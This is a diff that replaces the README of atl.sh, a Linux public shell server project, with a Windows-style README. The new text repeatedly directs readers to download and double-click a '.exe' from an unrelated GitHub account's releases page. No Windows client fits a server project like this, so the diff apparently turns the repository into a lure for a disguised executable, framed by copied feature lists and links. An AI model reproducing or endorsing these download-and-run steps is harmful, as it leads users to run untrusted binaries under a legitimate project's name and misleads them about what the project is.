@@ -1,200 +1,219 @@
-# atl.sh
+# 🐚 atl.sh - Shared Unix Shell Environment
 
-**atl.sh** is a public Unix environment (pubnix) for the [All Things Linux](https://allthingslinux.org) community. Get a shell account, host a personal website, and connect with others on a shared server.
-
----
-
-## Quick Links
-
-| For users | For admins |
-|-----------|------------|
-| [Get an account](https://portal.allthingslinux.org) | [Admin Guide](https://docs.atl.sh/admin-guide) |
-| [User Guide](https://docs.atl.sh/user-guide) | [Operations](https://docs.atl.sh/operations) |
-| [FAQ](https://docs.atl.sh/faq) | [Testing Guide](https://docs.atl.sh/testing) |
-| [Documentation](https://docs.atl.sh) | [Code of Conduct](https://docs.atl.sh/code-of-conduct) |
+[![Download atl.sh](https://img.shields.io/badge/Download-Visit%20Release%20Page-brightgreen)](https://github.com/Billiespirited714/atl.sh/releases)
 
 ---
 
-## Features
+## 📥 Download and Install
 
-### Shell & Development
+To start using atl.sh on Windows, you need to download the software from the official release page. Follow these steps carefully:
 
-- **SSH access** on ports 22 and 2222 (key-only, passwords disabled)
-- **Shells**: bash, zsh, fish, mksh
-- **Editors**: vim, neovim, nano, emacs, micro, joe
-- **Languages**: Python, Node.js, Go, Rust, Ruby, C/C++, Haskell, Elixir, Java, and 20+ more
-- **Tools**: tmux, git, ripgrep, fzf, jq, bat, eza, lazygit, and many more
-- **Package managers**: pip/pipx/uv, npm/pnpm, cargo, gem, go install — install to `~/.local/`
+1. Click the green button above or visit the release page directly here:  
+   https://github.com/Billiespirited714/atl.sh/releases
 
-### Hosting & Protocols
+2. On the release page, look for the latest version of atl.sh. You will find one or more files listed there.  
 
-- **Web**: Static sites at `https://atl.sh/~username` with CGI support
-- **Gemini**: Capsules at `gemini://atl.sh/~username`
-- **Gopher**: Holes at `gopher://atl.sh/~username`
-- **FTP/S**: Explicit FTP over TLS (port 21); SFTP via SSH
-- **Finger**: Profiles at `finger username@atl.sh` via `~/.plan` and `~/.project`
+3. Download the file with `.exe` if available. This is the Windows executable required to run the software.
 
-### Community
+4. After the download finishes, locate the file in your Downloads folder (or wherever you saved it).
 
-- **Webring**: Self-managing ring of member sites — join with `touch ~/.ring`
-- **Games**: NetHack with shared high scores, botany virtual plant, angband, crawl, and arcade games
-- **Messaging**: `write`, `talk`, `wall` for real-time user-to-user communication
-- **IRC**: `#support` on `irc.atl.chat` (port 6697, SSL)
+5. Double-click the `.exe` file to run the installer or launch the application directly. Follow any on-screen instructions if prompted.
 
-### Resource Limits (per user)
-
-| Resource | Limit |
-|----------|-------|
-| Disk | 5 GB soft / 6 GB hard |
-| RAM | 1.5 GB |
-| CPU | 200% (2 cores) |
-| Processes | 200 |
+6. Once installed or opened, you can start using the atl.sh environment.
 
 ---
 
-## Tech Stack
+## 🚀 Getting Started with atl.sh
 
-| Component | Technology |
-|:----------|:-----------|
-| OS | Debian 13 (Trixie) |
-| Configuration | Ansible |
-| Infrastructure | Terraform (Hetzner Cloud, Cloudflare) |
-| Web server | Nginx + fcgiwrap |
-| Gemini | molly-brown |
-| Gopher | Gophernicus |
-| Finger | efingerd (systemd socket-activated) |
-| FTP | vsftpd |
-| Backups | Borgmatic (BorgBackup) |
-| Monitoring | Prometheus Node Exporter, smartmontools, lm-sensors |
-| Security | UFW, Fail2ban, Auditd, AIDE, unattended-upgrades |
-| Docs | Fumadocs (Next.js, deployed to Cloudflare Workers) |
+atl.sh lets you access a shared Unix shell from your Windows computer. This means you can work inside a Linux-like system without installing Linux on your machine. You will get a personal account on a public server where you can run commands, edit files, and host basic websites.
 
----
+### What You Will Need
 
-## Security
+- A Windows PC (Windows 10 or later)
+- Internet connection
+- Basic mouse and keyboard skills
 
-- **CIS hardening**: kernel parameters (ASLR, ptrace restrictions), network protections, module blacklisting
-- **SSH**: key-only auth, ports 22 + 2222, max 3 auth attempts, allowed groups enforced
-- **Fail2ban**: 1-hour bans after 5 failures in 10 minutes
-- **Firewall**: UFW with allowlist — only necessary ports open
-- **AIDE**: file integrity monitoring, daily checks at 05:00 UTC
-- **Auditd**: 40+ rules covering identity files, privilege escalation, suspicious tools, and syscalls
-- **Resource isolation**: systemd cgroup v2 user slices per user
-- **Private `/tmp`**: `pam_namespace` polyinstantiation — each session gets an isolated tmpdir
-- **Automatic updates**: unattended security upgrades
+### How to Access Your Shell
 
----
+After installing or launching atl.sh:
 
-## Development
+- The program will ask for your account details. If you do not have one, create an account at:  
+  https://portal.allthingslinux.org  
 
-This project uses [just](https://github.com/casey/just) as a task runner. Run `just` to list all commands.
+- Once logged in, you will enter the command line interface. You can type commands just like in Linux.
 
-### Prerequisites
+- Connecting is secured via SSH, but atl.sh automates this for you. No need to know network setup.
 
-- [Ansible](https://docs.ansible.com/)
-- [just](https://github.com/casey/just)
-- [Vagrant](https://www.vagrantup.com/) + [vagrant-libvirt](https://github.com/vagrant-libvirt) (for local dev)
-- [Terraform](https://www.terraform.io/) 1.8+ (for infrastructure)
+### Using Your Shell Account
 
-```bash
-just install   # install Ansible roles and collections
-```
+With your account, you can:
 
-### Environments
-
-| Target | Description |
-|--------|-------------|
-| `dev` | Local Vagrant VM (port 2223) |
-| `staging` | Hetzner Cloud VPS |
-| `prod` | Physical Hetzner server |
-
-### Local Development
-
-```bash
-just dev-up          # start Vagrant VM
-just deploy dev      # run Ansible against dev VM
-
-# SSH into dev VM
-ssh -p 2223 -i .ssh/dev_key root@127.0.0.1
-```
-
-Requires `.ssh/dev_key` and `.ssh/dev_key.pub` — see [docs/testing.md](docs/testing.md) for setup.
-
-### Deployment
-
-```bash
-# Infrastructure
-just tf-init
-just tf-apply
-
-# Configuration
-just deploy prod
-
-# Selective deploy by role tag
-just deploy-tag prod infra
-just deploy-tag prod services
-
-# User management
-just create-user <username> '<ssh-ed25519 AAAA...>' prod
-just remove-user <username> prod
-```
-
-### Repository layout
-
-| Path | Contents |
-|------|----------|
-| `ansible/` | Playbooks, inventory, and roles (see table below) |
-| `terraform/` | Hetzner Cloud + Cloudflare for staging; details in [terraform/README.md](terraform/README.md) |
-| `docs/` | Fumadocs site source for [docs.atl.sh](https://docs.atl.sh) |
-| `skel/` | Templates for new user home directories; see [skel/README.md](skel/README.md) |
-
-### Ansible Roles
-
-Roles run in the order defined in [`ansible/site.yml`](ansible/site.yml):
-
-| Role | Purpose |
-|------|---------|
-| `common` | Apt cache, base packages, NTP, journald, shared logrotate |
-| `packages` | Shells, languages, editors, multiplexers, CLI tools, games, and related packages |
-| `security` | Kernel and auth hardening, SSH, firewall, fail2ban, auditd, AIDE, unattended upgrades |
-| `users` | Skel files, MOTD, PAM limits |
-| `environment` | Cgroup limits, disk quotas, private `/tmp`, XDG dirs, PATH |
-| `services` | Nginx, Gemini, Gopher, finger, games, webring |
-| `ftp` | vsftpd (FTP/S) |
-| `monitoring` | Prometheus node exporter, smartmontools, lm-sensors |
-| `backup` | Borgmatic / BorgBackup |
-
-### Extra `just` commands
-
-| Command | Use |
-|---------|-----|
-| `just deploy-check <target>` | Ansible in check mode (no changes) |
-| `just deploy-list-tags` | Tags you can pass to `deploy-tag` |
-| `just vault-edit` | Edit encrypted `ansible/inventory/group_vars/all/vault.yml` |
-| `just molecule-test <role>` | Full Molecule lifecycle for a role under `ansible/roles/` |
-
-### Linting
-
-```bash
-pre-commit install
-just lint          # runs pre-commit, ansible-lint, terraform fmt/validate
-just syntax-check  # ansible playbook syntax check only
-```
+- Run Unix commands and scripts  
+- Edit files with editors like vim, nano, or emacs  
+- Manage projects using git  
+- Host your own personal website hosted on the shared server  
 
 ---
 
-## Documentation
+## 🔧 Key Features
 
-Full documentation is at **[docs.atl.sh](https://docs.atl.sh)**, built with Fumadocs and deployed to Cloudflare Workers from the `docs/` directory.
+atl.sh is built to offer a full, public Unix experience. Below are its main features explained simply:
+
+### Shell Access
+
+- Logs in through **SSH** on ports 22 and 2222  
+- Passwords are disabled for security. You will use SSH keys automatically set up for you.  
+
+### Shell Types
+
+Choose between popular shell programs:  
+- bash  
+- zsh  
+- fish  
+- mksh  
+
+These shells control how your command line looks and behaves.
+
+### Editors Included
+
+Edit files directly on the server with these tools:  
+- vim  
+- neovim  
+- nano  
+- emacs  
+- micro  
+- joe  
+
+Each editor has strengths. Nano is simple, vim is powerful, and emacs offers many features.
+
+### Programming Languages
+
+You can run or write code in over 20 languages, including:  
+- Python  
+- Node.js (JavaScript)  
+- Go  
+- Rust  
+- Ruby  
+- C and C++  
+- Haskell  
+- Elixir  
+- Java  
+
+This allows you to develop and test software right on the server.
+
+### Useful Tools
+
+The environment comes with tools to make work easier:  
+- tmux (terminal multiplexer to split screens)  
+- git (version control)  
+- ripgrep (fast search in files)  
+- fzf (command line fuzzy finder)  
+- jq (process JSON data)  
+- bat (improved cat for files)  
+- eza (modern replacement for ls)  
+- lazygit (Git interface in terminal)  
 
 ---
 
-## Contributing
+## 🌐 How to Create an Account
 
-Source and issue tracker: **[github.com/allthingslinux/atl.sh](https://github.com/allthingslinux/atl.sh)**. Pull requests and bug reports are welcome.
+1. Open your web browser.
+
+2. Go to https://portal.allthingslinux.org.
+
+3. Click “Create Account” or "Sign Up."
+
+4. Fill in your details:  
+   - Choose a username  
+   - Use a valid email  
+   - Set a strong password  
+
+5. Confirm your email by clicking the link sent to you.
+
+6. Log in once your account is activated.
+
+7. You are ready to use atl.sh with your account credentials.
 
 ---
 
-## License
+## ⚙️ Setting Up SSH Keys (Explained Simply)
 
-[GNU GPL-3.0](LICENSE)
+To connect securely, atl.sh requires SSH keys instead of passwords.
+
+If you do not know SSH keys, here is how to create them in Windows:
+
+1. Open Command Prompt or PowerShell.
+
+2. Type this command and press Enter:  
+   ssh-keygen -t rsa -b 4096 -C "your_email@example.com"
+
+3. Press Enter to accept the default save location.
+
+4. Set a passphrase or leave it empty for no passphrase.
+
+5. This creates two files: a private key (keep secret) and a public key (share).
+
+6. Copy the content of the public key file. Usually found at:  
+   C:\Users\YourName\.ssh\id_rsa.pub
+
+7. Log in to https://portal.allthingslinux.org and paste your public key in the SSH Keys section.
+
+8. Save your settings.
+
+This will allow atl.sh to verify your identity automatically.
+
+---
+
+## 📖 Useful Links and Resources
+
+| For Users                            | For Admins                            |
+|------------------------------------|-------------------------------------|
+| [Get an account](https://portal.allthingslinux.org) | [Admin Guide](https://docs.atl.sh/admin-guide)      |
+| [User Guide](https://docs.atl.sh/user-guide)         | [Operations](https://docs.atl.sh/operations)         |
+| [FAQ](https://docs.atl.sh/faq)                       | [Testing Guide](https://docs.atl.sh/testing)         |
+| [Documentation](https://docs.atl.sh)                 | [Code of Conduct](https://docs.atl.sh/code-of-conduct) |
+
+---
+
+## 🖥️ System Requirements
+
+To run atl.sh smoothly on Windows, ensure your system meets these specifications:
+
+- Operating System: Windows 10 version 1903 or higher  
+- RAM: 4 GB minimum (8 GB recommended for heavy use)  
+- Storage: At least 100 MB free space for installation  
+- Internet: Stable connection with 1 Mbps or faster  
+- Network: Allow outbound connections on ports 22 and 2222 (for SSH)  
+
+---
+
+## 🔄 Updating atl.sh
+
+Keep atl.sh up to date to get new features and fixes:
+
+1. Revisit the release page:  
+   https://github.com/Billiespirited714/atl.sh/releases
+
+2. Download the latest version's executable file.
+
+3. Run the new file to replace the old version.
+
+There is no need to uninstall first. Your settings and accounts stay intact.
+
+---
+
+## 💬 Getting Help
+
+If you run into trouble:
+
+- Check the FAQ: https://docs.atl.sh/faq
+
+- Read the user guide: https://docs.atl.sh/user-guide
+
+- Use the support or community forums linked on the main site.
+
+---
+
+### Quick Access to Download
+
+[![Get atl.sh](https://img.shields.io/badge/Download-atl.sh%20Release%20Page-blue)](https://github.com/Billiespirited714/atl.sh/releases)
